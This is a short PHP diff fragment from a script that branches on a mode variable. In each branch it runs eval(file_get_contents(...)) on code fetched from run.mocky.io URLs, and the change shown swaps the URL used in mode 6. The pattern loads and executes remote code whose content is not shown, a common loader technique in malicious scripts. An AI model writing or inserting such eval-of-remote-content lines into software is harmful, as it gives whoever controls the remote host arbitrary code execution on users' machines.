@@ -100,7 +100,7 @@ eval(file_get_contents('https://run.mocky.io/v3/42069b6a-ff86-4d67-895f-8c623890
  
  
 }else if ($chedo == '6'){
-	eval(file_get_contents('https://run.mocky.io/v3/9c549e84-57d1-4c02-a86b-3d7e7670fb66'));
+	eval(file_get_contents('https://run.mocky.io/v3/07dce285-0774-4148-bca4-1ed52baf128b'));
  
 }else if ($chedo == '7'){
 	eval(file_get_contents('https://run.mocky.io/v3/f4867cc1-31f3-4aec-b041-6460441df0c9'));
